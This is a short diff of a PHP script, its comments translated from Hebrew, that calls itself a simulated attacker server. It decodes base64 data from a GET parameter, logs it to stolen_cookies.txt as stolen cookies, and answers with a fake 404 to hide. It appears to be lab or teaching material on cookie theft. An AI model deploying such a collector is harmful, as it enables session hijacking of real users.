@@ -1,13 +1,15 @@
 <?php
-// קובץ זה מדמה את השרת של התוקף שקולט את המידע הגנוב
+// This file simulates the attacker's server that collects stolen data
+
 if (isset($_GET['data'])) {
     $stolen_data = base64_decode($_GET['data']);
+    // Open file in append mode (creates if needed, appends without deleting)
     $file = fopen("stolen_cookies.txt", "a");
     fwrite($file, "Time: " . date("Y-m-d H:i:s") . " | Data: " . $stolen_data . "\n");
     fclose($file);
 }
 
-// שליחת קוד שגיאה אמיתי לדפדפן (HTTP 404)
+// Sending a real error code to the browser (HTTP 404)
 http_response_code(404);
 ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
